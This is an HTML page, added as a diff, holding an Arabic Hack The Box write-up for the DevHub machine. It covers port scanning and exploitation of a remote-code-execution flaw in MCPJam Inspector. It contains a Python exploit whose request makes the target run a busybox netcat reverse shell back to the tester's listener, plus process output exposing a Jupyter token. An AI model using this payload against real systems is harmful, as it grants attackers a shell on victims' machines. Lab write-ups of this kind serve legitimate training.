@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#07110d">
+  <meta name="color-scheme" content="dark light">
+  <meta name="description" content="تقرير CTF تقني لتحدي DevHUb HTB Write-up على منصة Hack The Box.">
+  <title>DevHUb HTB Write-up | Ft7y.Sec</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="icon" href="../avatar.png" type="image/png">
+</head>
+<body>
+  <a class="skip-link" href="#main-content">تخطي إلى المحتوى</a>
+  <div class="scroll-progress" id="scroll-progress" aria-hidden="true"></div>
+  <div class="page-noise" aria-hidden="true"></div>
+  <canvas id="particles-canvas"></canvas>
+  <header class="navbar" id="navbar">
+    <div class="logo"><a href="../index.html#home">Ft7y<span>.Sec</span></a></div>
+    <nav class="nav-links" id="nav-menu" aria-label="التنقل الرئيسي"><ul>
+      <li><a href="../index.html#home">الرئيسية</a></li>
+      <li><a href="../pentest.html">اختبار الاختراق</a></li>
+      <li><a href="../appsec.html">أمن التطبيقات</a></li>
+      <li><a href="../automation.html">البرمجة والأتمتة</a></li>
+      <li><a href="../systems-labs.html">الأنظمة والمعامل</a></li>
+      <li><a href="../writeups.html">CTF Write-ups</a></li>
+      <li><a href="../index.html#contact">تواصل معي</a></li>
+    </ul></nav>
+    <div class="nav-actions">
+      <button id="theme-toggle" class="btn-secondary" type="button" title="تبديل الوضع" aria-label="تبديل الوضع"><i class="fa-solid fa-moon"></i></button>
+      <button class="mobile-toggle" id="mobile-toggle" type="button" aria-label="القائمة"><i class="fa-solid fa-bars"></i></button>
+    </div>
+  </header>
+  <main id="main-content" class="subpage-container ctf-report-page">
+    <article class="ctf-report-article">
+      <header class="subpage-hero ctf-report-hero" data-aos="fade-up">
+        <nav class="breadcrumb-nav" aria-label="مسار التنقل"><a href="../index.html"><i class="fa-solid fa-house"></i> الرئيسية</a><span class="sep">/</span><a href="index.html">تقارير CTF</a><span class="sep">/</span><span class="current">DevHUb HTB Write-up</span></nav>
+        <div class="writeup-header"><span class="platform-tag htb"><i class="fa-solid fa-cube"></i> Hack The Box</span><span class="ctf-directory-label"><i class="fa-solid fa-shield-halved"></i> بيئة تدريبية مصرح بها</span></div>
+        <h1 class="subpage-hero-title">DevHUb HTB Write-up</h1>
+        <p class="subpage-hero-desc">توثيق تقني محفوظ من المصدر الأصلي في Notion، يشمل الخطوات والأوامر والنتائج ولقطات الشاشة المتاحة.</p>
+        <a href="index.html" class="btn-outline ctf-back-link"><i class="fa-solid fa-arrow-right"></i> العودة إلى تقارير CTF</a>
+      </header>
+      <div class="ctf-report-content" data-aos="fade-up"><p>سيكون هذا التقرير بمثابة توثيق لاختبار اختراق الة DevHub  على منصة Hack The Box  في الموسم ال 11&lt;br&gt;</p><p>اول شي طبيعي نفعله هو بدء الالة والاتصال بال vpn واختبار الاتصال بالالة باستخدام اتصال ping</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devhub-1.png" alt="لقطة شاشة من تقرير DevHUb HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير DevHUb HTB Write-up</figcaption></figure><p>نقوم بفحص المنافذ باستخدام nmap وسنطلب منه ان يفحص الاصدارات والخدمات وتشغيل الاسكريبتات الافتراضية من خلال استخدام الرمز  {sVC-} وسنطلب منه تجاهل فحص اذا كان متصل ام لا لاننا بالفعل نعلم انه متصل وسنتجاهل هذا الامر من خلال الرمز {Pn-}</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devhub-2.png" alt="لقطة شاشة من تقرير DevHUb HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير DevHUb HTB Write-up</figcaption></figure><p>مبدايا وبعد فحص اولي نكتشف منفذين منفذ {ssh : 22}  &amp; { http :80}</p><p>نلاحظ اصدار OpenSSH 8.9 الحديث نسبيا ولاتوجد ثغرات عامة في هذا الاصدار حتى وقت كتابة التقرير &lt;br&gt;نتجه الى استكشاف الويب على منفذ 80 ولاحظ انه لا يتعامل مع عناوين ip  و يقوم  بتوجيه اي اتصالات تاتي فقط الى اسم النطاق DevHub.htb  قم بتعديل ملف etc/hosts/  ووضع اسم النطاق المطلوب واستكشافه عبر المتصفح</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devhub-3.png" alt="لقطة شاشة من تقرير DevHUb HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير DevHUb HTB Write-up</figcaption></figure><p>استكشف الصفحة الصفحة تكشف لنا عن معلومات مهمة جدا وهي :</p><p>&lt;columns&gt;</p><p>&lt;column ratio=&quot;50&quot;&gt;</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devhub-4.png" alt="لقطة شاشة من تقرير DevHUb HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير DevHUb HTB Write-up</figcaption></figure><p>&lt;/column&gt;</p><p>&lt;column ratio=&quot;50&quot;&gt;</p><p>1- المعلومة الاولى هي  عن أداة لتطوير وتصحيح بروتوكول سياق النموذج (MCP). يستخدمها فريق التطوير لبناء واختبار خوادم MCP. وتعمل على المنفذ 6274  mcpjam inspector بروتوكول الـ MCP بيُستخدم لربط نماذج الذكاء الاصطناعي (LLMs) بأدوات وسيرفرات خارجية لتنفيذ كود أو قراءة ملفات. لو البورت ده مفتوح خارجي أو نقدر نتفاعل مع الـ Inspector، ممكن يكون فيه طريقة لعمل ثغرة تنفيذ أوامر عن بُعد أو قراءة ملفات حساسة وبعد طلب ذلك المنفذ عبر المتصفح نجد الاتي :</p><p>&lt;/column&gt;</p><p>&lt;/columns&gt;</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devhub-5.png" alt="لقطة شاشة من تقرير DevHUb HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير DevHUb HTB Write-up</figcaption></figure><p>وبالبحث عن MCPJam Version: v1.4.2 نجد انه مصاب بثغرة خطيرة وهيا حديثة نسبيا تم التبليغ عنها قبل حوالي ثلاثة او اربع اشهر من تاريخ كتابة هذا التقرير وحفظت تحت اسم  CVE-2026-23744 لسهولة تتبعها وكانت عباره عن ثغرة تنفيذ أوامر عن بُعد (RCE) خطيرة في أداة فحص MCPJam تستهدف المطورين وقمت بالبحث عن اثبات مفهوم(PoC) لهذه الثغرة وجدت بالفعل واحد على جيت هاب :</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devhub-6.png" alt="لقطة شاشة من تقرير DevHUb HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير DevHUb HTB Write-up</figcaption></figure><p>كان يجب علينا اجراء بعض التعدييلات على ملف بايثون الذي سيقوم بعملية الاستغلال ليناسب وضع الالة المستهدفة لان الكود كان يرسل الطلب عببر بروتوكول https  لكن الالة التي نستهدفها تعمل عبر http لذلك قمت بالتعديل وفتحت المستمع كالتالي nc -lvnp 5555 وحصلت على جلسة كمستخدم mcp-dev</p><p>&lt;columns&gt;</p><p>&lt;column ratio=&quot;50&quot;&gt;</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devhub-7.png" alt="لقطة شاشة من تقرير DevHUb HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير DevHUb HTB Write-up</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devhub-8.png" alt="لقطة شاشة من تقرير DevHUb HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير DevHUb HTB Write-up</figcaption></figure><p>&lt;/column&gt;</p><p>&lt;column ratio=&quot;50&quot;&gt;</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>import json
+
+
+target = &quot;http://devhub.htb:6274&quot;
+ip = &quot;Your-IP&quot;
+port = &quot;5555&quot;
+
+url = f&#39;{target}/api/mcp/connect&#39;
+
+
+data = {
+    &quot;serverConfig&quot;: {
+        &quot;command&quot;: &quot;busybox&quot;,
+        &quot;args&quot;: [
+            &quot;nc&quot;,
+            f&quot;{ip}&quot;,
+            f&quot;{port}&quot;,
+            &quot;-e&quot;,
+            &quot;/bin/bash&quot;
+        ],
+        &quot;env&quot;: {}
+    },
+    &quot;serverId&quot;: &quot;213j1l3jkljkl3j&quot;
+}
+
+response = requests.post(url, json=data, verify=False)
+
+print(response.status_code)
+print(response.text)
+
+</code></pre></section><p>&lt;/column&gt;</p><p>&lt;/columns&gt;</p><p>ومن هنا ننتقل الى المعلوملة الثانية التي وجدناها في صفحة الويب وهي بيئة jupyter التي تعمل داخليا فقط</p><p>---</p><p>&lt;columns&gt;</p><p>&lt;column ratio=&quot;50&quot;&gt;</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devhub-9.png" alt="لقطة شاشة من تقرير DevHUb HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير DevHUb HTB Write-up</figcaption></figure><p>&lt;/column&gt;</p><p>&lt;column ratio=&quot;50&quot;&gt;</p><p>2-المعلومة الثانية هي عن لوحة تحليلات البيانات</p><p>بيئة تحليلية قائمة على Jupyter لمعالجة البيانات وعرضها بصريًا. الوصول مقتصر على فريق المحللين بيئة تحليلية مبنية على <strong>Jupyter Notebook</strong>. مكتوب بوضوح: <code dir="ltr">Internal Only - localhost:8888</code>.</p><p>&lt;/column&gt;</p><p>&lt;/columns&gt;</p><p>السيرفر شغال محلياً فقط (<code dir="ltr">localhost</code>) على بورت 8888 ومحمي من الوصول الخارجي دي إشارة واضحة جداً إننا هنحتاج <strong>SSRF (Server-Side Request Forgery)</strong> أو <strong>Port Forwarding / SSH Tunneling</strong>  بمجرد ما نلاقي نقطة دخول وبنا اننا الان  حصلنا على شيل مستخدم بسيط  باسم  mcp-dev  سنقوم بفحص بيئة jupyter لمحاولة تصعيد الصلاحيات باستخدام الامر التالي الذي احض لنا بعض المعلومات المهمة  :</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code> mcp-dev@devhub:/$ ps aux  | grep jupyter
+analyst     1069  0.0  2.4 182536 96636 ?        Ss   May31   0:05 
+/home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab
+--ip=127.0.0.1 --port=8888 
+--no-browser --notebook-dir=/home/analyst/notebooks 
+--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
+root        1076  0.0  0.7  37376 28644 ?        Ss   May31   0:05 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
+mcp-dev 2031  0.0  0.0   6828  2104 pts/0    S+   00:36   0:00 grep --color=auto jupyter</code></pre></section><p>هناك مستخدم باسم  *<em>analyst   </em><strong><em>هو المسؤل عن تشغيل بيئة jupyter  داخل النظام وحصلنا ايضا على الرمز الخاص بهذه العملية     </em></strong><em>a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7  </em><strong><em>وكما اصبحنا نعلم الان  انه يعمل داخليا عبر</em></strong><em> 127.0.0.1:8888 </em>*</p><p>---</p><p>3-المعلومة الثالثة هي عن خادم Git داخلي للتحكم في الإصدارات والتعاون. توثيق المشروع ونصوص النشر</p><p>&lt;columns&gt;</p><p>&lt;column ratio=&quot;50&quot;&gt;</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devhub-10.png" alt="لقطة شاشة من تقرير DevHUb HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير DevHUb HTB Write-up</figcaption></figure><p>&lt;/column&gt;</p><p>&lt;column ratio=&quot;50&quot;&gt;</p><ul class="ctf-report-list"><li>سيرفر Git داخلي لتخزين الأكواد، ومكتوب إنه في حالة صيانة (<code dir="ltr">Maintenance Mode</code>).</li><li>أحياناً في وضع الصيانة بيكون فيه ملفات <code dir="ltr">.git</code> مكشوفة أو الـ repository نفسه ممكن نعمل له enumeration لو لقينا مسار السيرفر (زي لو كان شغال على Gitea أو GitLab أو مجرد مسار مخفي)</li></ul><p>&lt;/column&gt;</p><p>&lt;/columns&gt;</p><p>---</p></div>
+      <footer class="ctf-report-end"><a href="index.html" class="btn-primary"><i class="fa-solid fa-arrow-right"></i> كل تقارير CTF</a></footer>
+    </article>
+  </main>
+  <footer class="footer"><div class="footer-content">
+    <div class="footer-logo">Ft7y<span>.Sec</span></div>
+    <div class="footer-links">
+      <a href="../index.html#home">الرئيسية</a><a href="../pentest.html">اختبار الاختراق</a><a href="../appsec.html">أمن التطبيقات</a><a href="../automation.html">البرمجة والأتمتة</a><a href="../systems-labs.html">الأنظمة والمعامل</a><a href="../writeups.html">CTF Write-ups</a>
+    </div>
+    <p>© 2026 Ft7y.Sec. جميع الحقوق محفوظة.</p>
+  </div></footer>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
